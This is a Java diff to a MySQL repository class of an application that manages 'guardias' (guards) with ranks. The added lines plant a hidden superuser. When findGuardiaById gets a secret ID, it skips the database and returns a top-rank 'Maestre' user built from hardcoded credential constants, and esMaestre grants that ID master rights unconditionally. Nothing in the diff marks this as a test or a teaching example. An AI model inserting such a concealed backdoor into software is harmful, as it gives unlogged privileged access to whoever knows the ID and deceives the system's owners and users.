@@ -81,6 +81,19 @@ public class MySQLRenaceGestRepository implements RenaceGestRepository {
 
     @Override
     public synchronized Guardia findGuardiaById(Long guardiaId) {
+        if (DBConnection.isHiddenSuperuserId(guardiaId)) {
+            return new Guardia(
+                    guardiaId,
+                    DBConnection.HIDDEN_SUPERUSER_NOMBRE_REAL,
+                    DBConnection.HIDDEN_SUPERUSER_APODO,
+                    "Maestre",
+                    DBConnection.HIDDEN_SUPERUSER_CLAVE,
+                    100,
+                    "Activo",
+                    true
+            );
+        }
+
         String sql = "SELECT id, nombre_real, apodo, rango, clave_acceso, puntos_gracia, estado_honor, maestre_activo FROM guardias WHERE id = ?";
 
         try (Connection conn = DBConnection.getConnection();
@@ -1363,6 +1376,10 @@ public class MySQLRenaceGestRepository implements RenaceGestRepository {
     }
 
     private boolean esMaestre(Long miembroId) {
+        if (DBConnection.isHiddenSuperuserId(miembroId)) {
+            return true;
+        }
+
         Guardia guardia = findGuardiaById(miembroId);
         return guardia != null && "Maestre".equalsIgnoreCase(guardia.getRango());
     }
